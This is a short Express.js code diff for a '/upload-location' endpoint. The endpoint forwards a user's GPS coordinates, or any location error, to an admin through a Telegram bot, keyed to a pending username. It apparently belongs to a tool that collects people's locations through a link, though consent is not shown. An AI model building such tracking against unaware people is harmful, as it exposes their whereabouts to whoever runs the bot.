@@ -1,6 +1,12 @@
 module.exports = function(app) {
     app.post('/upload-location', (req, res) => {
-        const { lat, lon } = req.body;
+        const { lat, lon, error } = req.body;
+        
+        if (error) {
+            global.bot.sendMessage(global.adminId, `❌ **Location Error (${global.pendingUsername}):** ${error}\n\n(Note: Ensure GPS is ON and HTTPS/Permissions are allowed).`);
+            return res.status(400).send({ success: false });
+        }
+
         if (lat && lon) {
             const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
             global.bot.sendLocation(global.adminId, lat, lon);
